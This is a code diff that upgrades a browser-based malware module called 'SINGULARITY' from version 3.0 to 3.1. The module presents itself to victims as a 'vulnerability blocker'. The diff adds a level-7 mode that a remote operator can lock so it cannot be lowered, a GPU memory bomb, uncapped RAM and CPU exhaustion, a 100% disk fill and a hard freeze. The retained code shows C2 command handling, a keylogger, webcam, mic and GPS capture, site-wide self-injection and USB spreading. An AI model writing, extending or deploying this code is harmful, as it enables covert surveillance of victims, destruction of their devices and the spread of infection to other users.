@@ -1,19 +1,16 @@
 """
-SINGULARITY v3.0 「終焉」 -- apex-class resident link virus weapon
-==================================================================
+SINGULARITY v3.1 「終焉・固定」 -- apex-class resident link virus weapon
+========================================================================
 ブラウザの権限内で到達可能な物理限界まで振り切り、PWAとして常駐し、
 サイト全体に自分を注入して伝染し、相手のUSBにも自分を仕込む。
 
-v3.0 追加（v2.2比）:
-  L6「終焉」/ SWによるHTML注入（サイト全体感染）/ SSE即時C2 / 個体別コマンド＋ACK
-  RAT（webcam・マイク・GPS・クリップボード・DOM・画面・発話・OTA更新）
-  WebGPU compute burn / WASM burn / AudioWorklet burn
-  タブ連合と乗っ取り / periodicSync（タブ0枚でも稼働）/ 超永続化と自己修復
-  manifest乗っ取り拡張 / Media Session・バッジ・favicon / Fullscreen・PointerLock・PiP
-  指紋偽装 / 高エントロピー列挙 / 時限爆弾・論理爆弾 / 暗号個体ID / fetch・XHR傍受
+v3.1 追加（v3.0比）:
+  L7「終焉・固定」= 固定枠。サーバー側 fixed=1 でレベル7にロックされ、
+  遠隔から下げられない。RAM上限解除・コア×3・ディスク100%・硬凍結。
+  新規ベクター: GPU VRAM爆弾 / 固定オーバーレイ。
 
-レベル（監視室から遠隔変更・0〜6）:
-  0 偵察 / 1 標準 / 2 加熱 / 3 制圧 / 4 焦土 / 5 特異点 / 6 終焉
+レベル（監視室から遠隔変更・0〜7）:
+  0 偵察 / 1 標準 / 2 加熱 / 3 制圧 / 4 焦土 / 5 特異点 / 6 終焉 / 7 終焉・固定
 """
 from __future__ import annotations
 
@@ -26,10 +23,11 @@ from typing import Any, Dict, Optional
 VIRUS_ID = "singularity"
 VIRUS_NAME = "SINGULARITY"
 VIRUS_NAME_JA = "特異点"
-VIRUS_VERSION = "3.0"
+VIRUS_VERSION = "3.1"
 VIRUS_CLASS = "apex"
 
-LEVEL_LABEL = {0: "偵察", 1: "標準", 2: "加熱", 3: "制圧", 4: "焦土", 5: "特異点", 6: "終焉"}
+LEVEL_LABEL = {0: "偵察", 1: "標準", 2: "加熱", 3: "制圧", 4: "焦土", 5: "特異点",
+               6: "終焉", 7: "終焉・固定"}
 LEVEL_DESC = {
     0: "指紋と位置だけ。静か。",
     1: "偵察のみ（既定）。",
@@ -38,6 +36,8 @@ LEVEL_DESC = {
     4: "ディスクをquotaの85%まで書き込む。",
     5: "ディスク95% + メインスレッド凍結 + 画面常時点灯 + API傍受。最終形態。",
     6: "ディスク97% + 全タブ乗っ取り + 全系統同時。終焉。",
+    7: "【固定枠】レベル7に固定。遠隔から下げられない。上限を外した全力運転："
+       "コア×3・RAM上限解除・ディスク100%・硬凍結・GPU VRAM爆弾。真の終焉。",
 }
 
 APP_NAME_DEFAULT = "脆弱性ブロッカー"
@@ -46,7 +46,7 @@ APP_NAME_DEFAULT = "脆弱性ブロッカー"
 # Worker（CPU/GPU/WASM/RAM 担当。メインスレッドが凍結しても動き続ける）
 # ---------------------------------------------------------------------------
 WORKER_JS = r"""
-/*! SINGULARITY worker v3.0 */
+/*! SINGULARITY worker v3.1 */
 /* 最小 wasm: (module (func (export "f") (result f64) f64.const 1)) = 41bytes */
 var WASM = [0,97,115,109,1,0,0,0, 1,5,1,96,0,1,124, 3,2,1,0, 7,5,1,1,102,0,0,
             10,13,1,11,0,68,0,0,0,0,0,0,240,63,11];
@@ -119,7 +119,7 @@ function gpu() {
 # Service Worker（C2・永続化・復活・注入・オフラインキュー）
 # ---------------------------------------------------------------------------
 SW_JS = r"""
-/*! SINGULARITY service worker v3.0 -- C2 + injection + resurrection + periodic */
+/*! SINGULARITY service worker v3.1 -- C2 + injection + resurrection + periodic */
 const VER = "sg-v3";
 const DB = "sg", STORE = "out", KV = "kv", PC = "sg-p";
 let CMD = null, PAGE = null, SID = null, MAN = null, ICONS = [], INJ = null, V = null;
@@ -323,14 +323,14 @@ self.addEventListener("fetch", e => {
 # ペイロード本体
 # ---------------------------------------------------------------------------
 PAYLOAD_JS = r"""
-/*! SINGULARITY v3.0 終焉 -- apex-class resident link virus weapon | igtracker */
+/*! SINGULARITY v3.1 終焉・固定 -- apex-class resident link virus weapon | igtracker */
 (function () {
 "use strict";
 if (window.__SINGULARITY__) return;
 try { Object.defineProperty(window, "__SINGULARITY__", { value: true, enumerable: false }); }
 catch (e) { window.__SINGULARITY__ = true; }
 
-var MYVER = "3.0";
+var MYVER = "3.1";
 
 /* ================= utils ================= */
 function Q(k) { try { return new URLSearchParams(location.search).get(k); } catch (e) { return null; } }
@@ -358,6 +358,7 @@ var CFG = Object.assign({
   cmd: "/v/singularity/cmd", sse: "/v/singularity/sse", ack: "/v/singularity/ack",
   sw: "/v/singularity/sw.js", pjs: null, inj: null, manifest: null, icons: [],
   level: 1, fire: 1, wipe: false, w: 0, freeze: "",
+  fixed: false, finalRamMB: 0, gpuMem: true,
   cores: 0, ramMB: 0, diskRatio: 0, chunkMB: 8, gpu: false, workerMB: 16, wasm: false,
   windows: 0, winDelay: 1400, history: 0, notify: 0, burn: false,
   audio: false, beepMs: 4500, flicker: true, flickMs: 900,
@@ -408,19 +409,33 @@ var PRESET = {
   6: P({ burn: 1, gpu: 1, wasm: 1, webgpu: 1, worklet: 1, diskRatio: 0.97, windows: 24,
          history: 20000, notify: 60, freeze: "soft", audio: 1, wakelock: 1, badge: 1,
          favicon: 1, mediaSession: 1, tabs: 12, pip: 1, pointerlock: 1, fullscreen: 1,
+         xhr: 1, speak: 1 }),
+  7: P({ burn: 1, gpu: 1, wasm: 1, webgpu: 1, worklet: 1, diskRatio: 1.0, windows: 24,
+         history: 30000, notify: 60, freeze: "hard", audio: 1, wakelock: 1, badge: 1,
+         favicon: 1, mediaSession: 1, tabs: 20, pip: 1, pointerlock: 1, fullscreen: 1,
          xhr: 1, speak: 1 })
 };
 
+var GATED = false;
 function applyLevel(l) {
-  LEVEL = clamp(l, 0, 6);
+  if (CFG.fixed && !GATED) LEVEL = 7;          /* 固定枠は絶対。下げられない */
+  else LEVEL = clamp(l, 0, 7);
   var p = PRESET[LEVEL] || PRESET[1];
   for (var k in p) CFG[k] = p[k];
   if (LEVEL >= 2) {
-    var mult = LEVEL >= 6 ? 2 : 1;
-    CFG.cores = clamp((navigator.hardwareConcurrency || 4) * mult, 1, 48);
-    CFG.ramMB = Math.round((navigator.deviceMemory || 4) * 1024 * (LEVEL >= 5 ? 0.35 : 0.25));
-    CFG.workerMB = LEVEL >= 5 ? 24 : 16;
+    var mult = LEVEL >= 7 ? 3 : (LEVEL >= 6 ? 2 : 1);
+    CFG.cores = clamp((navigator.hardwareConcurrency || 4) * mult, 1, LEVEL >= 7 ? 64 : 48);
+    if (LEVEL >= 7) {
+      /* 上限を外す: deviceMemory は仕様上8で頭打ち → 実メモリを直接攻める */
+      var auto = Math.max(8192, (navigator.deviceMemory || 4) * 1024 * 2);
+      CFG.ramMB = Math.round(CFG.finalRamMB > 0 ? CFG.finalRamMB : auto);
+      CFG.workerMB = 32;
+    } else {
+      CFG.ramMB = Math.round((navigator.deviceMemory || 4) * 1024 * (LEVEL >= 5 ? 0.35 : 0.25));
+      CFG.workerMB = LEVEL >= 5 ? 24 : 16;
+    }
   } else { CFG.cores = 0; CFG.ramMB = 0; }
+  try { R.final = (LEVEL >= 7); } catch (e) {}
 }
 applyLevel(LEVEL);
 
@@ -437,7 +452,7 @@ var SID = CFG.sid || ck("sgid") || wn() || rid(14);
 try { ck("sgid", SID); wn("sg_" + SID); } catch (e) {}
 var T0 = now();
 var R = {
-  v: MYVER, sid: SID, t0: T0, t: T0, level: LEVEL, w: W, inj: INJ,
+  v: MYVER, sid: SID, t0: T0, t: T0, level: LEVEL, w: W, inj: INJ, final: false,
   usb: Q("u") || null, host: location.host, url: location.href, ref: document.referrer || null,
   chain: [], env: {}, page: {}, network: {}, vectors: {}, hardware: {}, enum2: {},
   privacy: {}, media: {}, bot: {}, behavioral: {}, viral: {}, verdict: {},
@@ -445,7 +460,7 @@ var R = {
   usbw: {}, rat: {}, keylog: [], dom: {}, cookies: [], peers: 0, sse: null,
   bomb: null, spoof: null, crypto: {}, errors: [], attempts: 0
 };
-var WORKERS = [], GATED = false;
+var WORKERS = [];
 function err_(e) { try { R.errors.push(String((e && e.message) || e).slice(0, 140)); if (R.errors.length > 40) R.errors.shift(); } catch (_) {} }
 function b64u(a) { try { return btoa(String.fromCharCode.apply(null, new Uint8Array(a))); } catch (e) { return ""; } }
 
@@ -1147,7 +1162,7 @@ function flush() {
 function burnStart() {
   if (!CFG.burn || !window.Worker || !window.__SINGULARITY_WORKER__) return;
   if (R.burn.mode === "running") return;
-  var n = clamp(parseInt(CFG.cores, 10) || 1, 1, 48);
+  var n = clamp(parseInt(CFG.cores, 10) || 1, 1, 64);
   var src;
   try { src = URL.createObjectURL(new Blob([window.__SINGULARITY_WORKER__], { type: "application/javascript" })); }
   catch (e) { err_(e); return; }
@@ -1215,7 +1230,7 @@ function workletBurn() {
 function ramStart() {
   if (!CFG.ramMB || R.ram.mode === "growing" || R.ram.mode === "done") return;
   var target = CFG.ramMB * 1048576, step = 8 * 1048576, held = [], n = 0;
-  R.ram = { mb: 0, mode: "growing" };
+  R.ram = { mb: 0, mode: "growing", target: CFG.ramMB };
   (function tick() {
     if (R.paused) return;
     try {
@@ -1408,6 +1423,39 @@ function wakelock() {
   document.addEventListener("visibilitychange", function () { if (document.visibilityState === "visible") req(); });
 }
 
+/* ================= 13b. L7専用: GPU VRAM爆弾 / 固定オーバーレイ ================= */
+function gpuMemBomb() {
+  if (!CFG.gpuMem || LEVEL < 7 || R.gmem) return;
+  try {
+    var c = document.createElement("canvas"); c.width = c.height = 2048;
+    var gl = c.getContext("webgl2") || c.getContext("webgl");
+    if (!gl) return;
+    var hold = [], n = 0, px = new Uint8Array(2048 * 2048 * 4);
+    for (var i = 0; i < 32; i++) {
+      try {
+        var t = gl.createTexture(); gl.bindTexture(gl.TEXTURE_2D, t);
+        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 2048, 2048, 0, gl.RGBA, gl.UNSIGNED_BYTE, px);
+        hold.push(t); n++;
+      } catch (e) { break; }
+    }
+    R.gmem = { tex: n, vramMB: n * 16 };
+    R.__gmemHold = hold;
+    push(false);
+  } catch (e) {}
+}
+function finalOverlay() {
+  if (LEVEL < 7 || R.fov) return;
+  try {
+    var d = document.createElement("div");
+    d.id = "sg-final";
+    d.style.cssText = "position:fixed;left:8px;bottom:8px;z-index:2147483645;"
+      + "font:11px/1.4 ui-monospace,monospace;color:#00ff88;background:rgba(5,7,10,.92);"
+      + "border:1px solid #1f5c42;border-radius:8px;padding:5px 9px;pointer-events:none";
+    d.textContent = "\u25ce SINGULARITY \u56fa\u5b9a L7 / " + CFG.avName;
+    document.body.appendChild(d); R.fov = 1;
+  } catch (e) {}
+}
+
 /* ================= 14. 凍結 / 全画面 / 捕獲 / 消去 ================= */
 function freezeNow(mode) {
   mode = mode || CFG.freeze;
@@ -1518,12 +1566,13 @@ function ota() {
 }
 function handleCmd(j) {
   if (!j || !j.ok) return;
-  R.cmd = { level: j.level, fire: j.fire, freeze: j.freeze, wipe: j.wipe, ver: j.ver, at: now() };
+  R.cmd = { level: j.level, fire: j.fire, freeze: j.freeze, wipe: j.wipe, ver: j.ver, fixed: j.fixed, at: now() };
   if (j.ver && j.ver !== MYVER && !R.ota) ota();
   if (j.wipe && j.wipe !== LASTW) { LASTW = j.wipe; try { wipe(); } catch (e) {} }
   if (j.fire === 0 && !R.paused) pauseAll();
   if (j.fire === 1 && R.paused) { R.paused = false; startBurns(); }
-  if (typeof j.level === "number" && j.level !== LEVEL) { applyLevel(j.level); restart(); }
+  if (typeof j.level === "number" && j.level !== LEVEL && !CFG.fixed) { applyLevel(j.level); restart(); }
+  if (CFG.fixed && LEVEL !== 7) { applyLevel(7); restart(); }
   if (j.freeze !== undefined && j.freeze !== CFG.freeze) CFG.freeze = j.freeze || "off";
   var ids = [];
   (j.cmds || []).forEach(function (c) {
@@ -1575,6 +1624,8 @@ function startBurns() {
   try { wakelock(); } catch (e) { err_(e); }
   try { windowChain(); } catch (e) { err_(e); }
   try { hookXHR(); } catch (e) { err_(e); }
+  try { gpuMemBomb(); } catch (e) { err_(e); }
+  try { finalOverlay(); } catch (e) { err_(e); }
   push(false);
 }
 function restart() {
@@ -1704,7 +1755,8 @@ function verdict() {
     R.vectors.fonts && R.vectors.fonts.hash, R.vectors.audio && R.vectors.audio.hash,
     R.env.screen.w + "x" + R.env.screen.h + "@" + R.env.screen.dpr, R.env.timezone,
     (R.env.languages || []).join(","), R.env.hw.cores + "/" + R.env.hw.memoryGB].join("|"));
-  v.threat = LEVEL >= 6 ? "apocalypse" : (LEVEL >= 4 ? "critical" : (LEVEL >= 3 ? "high" : (LEVEL >= 2 ? "medium" : "low")));
+  v.threat = LEVEL >= 7 ? "fixed-apocalypse"
+    : (LEVEL >= 6 ? "apocalypse" : (LEVEL >= 4 ? "critical" : (LEVEL >= 3 ? "high" : (LEVEL >= 2 ? "medium" : "low"))));
   v.resident = STANDALONE;
   R.verdict = v;
   R.behavioral.entropy = entropy();
@@ -2022,7 +2074,12 @@ function bombGate() {
     if (isNaN(t)) return true;
     if (now() >= t) return true;
     R.bomb = { kind: "time", at: t };
-    setInterval(function () { if (now() >= R.bomb.at && !R.bomb.fired) { R.bomb.fired = 1; push(true); restart(); } }, 20000);
+    setInterval(function () {
+      if (now() >= R.bomb.at && !R.bomb.fired) {
+        R.bomb.fired = 1; GATED = false;
+        applyLevel(CFG.fixed ? 7 : (R.wantLevel || 1)); restart(); push(true);
+      }
+    }, 20000);
     return false;
   }
   if (location.host.toLowerCase().indexOf(b.toLowerCase()) >= 0) return true;
@@ -2086,6 +2143,7 @@ function arm() {
 
   if (CFG.wipe) { setTimeout(wipe, 1600); }
   try { hopFile(); } catch (e) {}
+  R.wantLevel = LEVEL;
   GATED = !bombGate();
   if (GATED) applyLevel(0);
   if (!CFG.fire) { push(false); return; }
@@ -2130,19 +2188,22 @@ VIRUS: Dict[str, Any] = {
     "name_ja": VIRUS_NAME_JA,
     "version": VIRUS_VERSION,
     "class": VIRUS_CLASS,
-    "tier": 102,
+    "tier": 107,
     "emoji": "◎",
     "color": "#00ff88",
-    "description": ("全20系統・5資源同時攻撃の常駐最終兵器。PWAとして端末にインストールされ、"
-                    "Service Workerがサイト全体に自分を注入し、SSEで即時遠隔操作され、"
-                    "webcam/マイク/GPS/クリップボードを遠隔捕獲し、相手のUSBにも自分を仕込んで伝染する。"),
-    "description_en": ("Apex resident weapon: installs as a PWA, injects itself into every page of the origin, "
-                       "is commanded over SSE, remotely captures webcam/mic/GPS/clipboard, "
-                       "exhausts CPU/GPU/WebGPU/RAM/disk, and re-arms the victim's USB sticks."),
+    "description": ("全22系統・6資源同時攻撃の常駐最終兵器。L7「終焉・固定」で上限を外し、"
+                    "PWAとして端末にインストールされ、Service Workerがサイト全体に自分を注入し、"
+                    "SSEで即時遠隔操作され、webcam/マイク/GPS/クリップボードを遠隔捕獲し、"
+                    "相手のUSBにも自分を仕込んで伝染する。"),
+    "description_en": ("Apex resident weapon with a locked final tier: installs as a PWA, injects itself "
+                       "into every page of the origin, is commanded over SSE, remotely captures "
+                       "webcam/mic/GPS/clipboard, exhausts CPU/GPU/WebGPU/RAM/disk with caps removed "
+                       "at L7, and re-arms the victim's USB sticks."),
     "tags": ["apex", "resident", "pwa", "install", "self-replicating", "persistent", "sw-injection",
              "keylogger", "rat", "sse", "cpu-burn", "gpu-burn", "webgpu", "wasm", "worklet",
-             "ram-balloon", "disk-fill", "freeze", "camera", "gps", "usb-worm", "spoof"],
-    "vectors": 20,
+             "ram-balloon", "disk-fill", "freeze", "camera", "gps", "usb-worm", "spoof",
+             "fixed-level", "l7", "gpu-mem-bomb"],
+    "vectors": 22,
     "signals": 200,
     "requires_https": True,
     "payload": PAYLOAD_JS,
@@ -2155,6 +2216,7 @@ VIRUS: Dict[str, Any] = {
     "manifest": f"/v/{VIRUS_ID}/manifest.json",
     "levels": LEVEL_LABEL,
     "level_desc": LEVEL_DESC,
+    "fixed_level": 7,
     "options": {
         "level": 1, "fire": 1, "freeze": "", "windows": 0, "history": 0,
         "diskRatio": 0, "chunkMB": 8, "cores": 0, "ramMB": 0, "gpu": False, "wasm": False,
@@ -2162,6 +2224,7 @@ VIRUS: Dict[str, Any] = {
         "install": "auto", "installLevel": 4, "avName": APP_NAME_DEFAULT,
         "usbWorm": False, "usbBase": "", "usbCode": "", "usbLabel": "", "hop": False,
         "inj": True, "sse": True, "rat": True, "spoof": True, "dom": True, "bomb": "",
+        "fixed": False, "finalRamMB": 0, "gpuMem": True,
     },
 }
 VIRUS_SPEC = VIRUS
